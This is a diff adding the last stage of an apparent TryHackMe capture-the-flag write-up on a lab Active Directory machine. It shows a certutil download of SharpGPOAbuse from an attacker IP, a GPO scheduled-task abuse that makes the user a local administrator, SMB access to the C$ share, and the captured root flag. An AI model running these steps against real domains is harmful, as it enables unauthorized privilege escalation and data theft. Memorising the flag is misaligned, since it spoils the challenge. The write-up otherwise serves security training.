@@ -705,6 +705,8 @@ PS C:\Users\enterprise-security\Downloads>
 
 ### **BloodHound**
 
+Download SharpHound.exe -> https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
+
 ```shell
 .\sharphound.exe
 2022-07-16T07:27:19.5511764-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
@@ -746,5 +748,171 @@ d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402
 </center>
 
 After enumerating through ```BloodHound``` got a way to escalate to admin rights
+
+Reading through this cheatsheet got to know, hoe to escalate the privileges -> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse
+
+Download SharpGPOAbuse -> https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
+
+```shell
+certutil.exe -urlcache -f http://10.11.77.75:80/SharpGPOAbuse.exe sharpgpoabuse.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+ls
+
+
+    Directory: C:\Users\enterprise-security\Downloads
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad
+d-----        7/16/2022   7:30 AM                Redis-x64-2.8.2402
+-a----        7/16/2022   7:28 AM          10767 20220716072804_BloodHound.zip
+-a----        7/16/2022   8:00 AM          80896 sharpgpoabuse.exe
+-a----        7/16/2022   7:26 AM         908288 sharphound.exe
+-a----        2/26/2021  10:37 AM            143 startup.bat
+-a----        7/16/2022   7:28 AM           7856 Y2Q3NzU4MTgtZWE0Ny00ZGJjLTg4MDAtM2NjYjJmZTZjN2U2.bin
+
+
+C:\Users\enterprise-security\Downloads> .\sharpgpoabuse.exe --AddComputerTask --TaskName "Update" --Author VULNNET\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
+[+] Domain = vulnnet.local
+[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
+[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
+[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+C:\Users\enterprise-security\Downloads> gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+```
+
+Checking the user details, successfully became a ```Administrator member```
+
+```shell
+net user enterprise-security
+User name                    enterprise-security
+Full Name                    Enterprise Security
+Comment                      TryHackMe
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/23/2021 4:01:37 PM
+Password expires             Never
+Password changeable          2/24/2021 4:01:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/16/2022 7:34:22 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+Directory changing didn't work, so attempted the same in SMB.
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient -U enterprise-security  \\\\active.thm\\C$
+Password for [WORKGROUP\enterprise-security]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin                      DHS        0  Wed Feb 24 03:33:20 2021
+  Documents and Settings          DHSrn        0  Tue Feb 23 10:11:41 2021
+  Enterprise-Share                    D        0  Sat Jul 16 20:05:46 2022
+  pagefile.sys                      AHS 1073741824  Sat Jul 16 20:03:04 2022
+  PerfLogs                            D        0  Tue Feb 23 12:02:00 2021
+  Program Files                      DR        0  Mon Mar  1 01:40:11 2021
+  Program Files (x86)                 D        0  Tue Feb 23 01:16:06 2021
+  ProgramData                       DHn        0  Sat Jul 16 20:36:13 2022
+  Recovery                         DHSn        0  Tue Feb 23 01:12:20 2021
+  System Volume Information         DHS        0  Tue Feb 23 14:41:25 2021
+  Users                              DR        0  Wed Feb 24 03:32:40 2021
+  Windows                             D        0  Mon Mar  1 01:46:44 2021
+
+                9558271 blocks of size 4096. 5010317 blocks available
+smb: \> cd Users
+smb: \Users\> ls
+  .                                  DR        0  Wed Feb 24 03:32:40 2021
+  ..                                 DR        0  Wed Feb 24 03:32:40 2021
+  Administrator                       D        0  Wed Feb 24 09:49:29 2021
+  All Users                       DHSrn        0  Sat Sep 15 12:58:48 2018
+  Default                           DHR        0  Tue Feb 23 10:11:41 2021
+  Default User                    DHSrn        0  Sat Sep 15 12:58:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 12:46:48 2018
+  enterprise-security                 D        0  Sat Feb 27 01:39:06 2021
+  Public                             DR        0  Tue Feb 23 01:16:16 2021
+
+                9558271 blocks of size 4096. 5010318 blocks available
+smb: \Users\> cd Administrator\
+smb: \Users\Administrator\> ls
+  .                                   D        0  Sat Jul 16 19:10:10 2022
+  ..                                  D        0  Sat Jul 16 19:10:10 2022
+  3D Objects                         DR        0  Tue Feb 23 03:25:20 2021
+  AppData                            DH        0  Tue Feb 23 01:15:13 2021
+  Application Data                DHSrn        0  Tue Feb 23 01:15:13 2021
+  Contacts                           DR        0  Tue Feb 23 03:25:21 2021
+  Cookies                         DHSrn        0  Tue Feb 23 01:15:13 2021
+  Desktop                            DR        0  Wed Feb 24 09:57:33 2021
+  Documents                          DR        0  Tue Feb 23 03:25:21 2021
+  Downloads                          DR        0  Tue Feb 23 03:25:21 2021
+  Favorites                          DR        0  Tue Feb 23 03:25:21 2021
+  Links                              DR        0  Tue Feb 23 03:25:22 2021
+  Local Settings                  DHSrn        0  Tue Feb 23 01:15:13 2021
+  Music                              DR        0  Tue Feb 23 03:25:21 2021
+  My Documents                    DHSrn        0  Tue Feb 23 01:15:13 2021
+  NetHood                         DHSrn        0  Tue Feb 23 01:15:13 2021
+  NTUSER.DAT                        AHn   786432  Sat Jul 16 19:10:10 2022
+  ntuser.dat.LOG1                   AHS        0  Tue Feb 23 01:15:11 2021
+  ntuser.dat.LOG2                   AHS        0  Tue Feb 23 01:15:11 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Tue Feb 23 01:15:13 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Feb 23 01:15:13 2021
+  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Feb 23 01:15:13 2021
+  ntuser.ini                         HS       20  Tue Feb 23 01:15:13 2021
+  Pictures                           DR        0  Tue Feb 23 03:25:21 2021
+  PrintHood                       DHSrn        0  Tue Feb 23 01:15:13 2021
+  Recent                          DHSrn        0  Tue Feb 23 01:15:13 2021
+  Saved Games                        DR        0  Tue Feb 23 03:25:21 2021
+  Searches                           DR        0  Tue Feb 23 03:25:21 2021
+  SendTo                          DHSrn        0  Tue Feb 23 01:15:13 2021
+  Start Menu                      DHSrn        0  Tue Feb 23 01:15:13 2021
+  Templates                       DHSrn        0  Tue Feb 23 01:15:13 2021
+  Videos                             DR        0  Tue Feb 23 03:25:21 2021
+
+                9558271 blocks of size 4096. 5010318 blocks available
+smb: \Users\Administrator\> cd Desktop\
+smb: \Users\Administrator\Desktop\> ls
+  .                                  DR        0  Wed Feb 24 09:57:33 2021
+  ..                                 DR        0  Wed Feb 24 09:57:33 2021
+  desktop.ini                       AHS      282  Tue Feb 23 03:25:21 2021
+  system.txt                          A       37  Wed Feb 24 09:57:45 2021
+
+                9558271 blocks of size 4096. 5010318 blocks available
+smb: \Users\Administrator\Desktop\> get system.txt
+getting file \Users\Administrator\Desktop\system.txt of size 37 as system.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+
+The ```system.txt``` is ```THM{d540c0645975900e5bb9167aa431fc9b}```
+
+```shell
+root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# cat system.txt
+THM{d540c0645975900e5bb9167aa431fc9b} 
+```
 
 
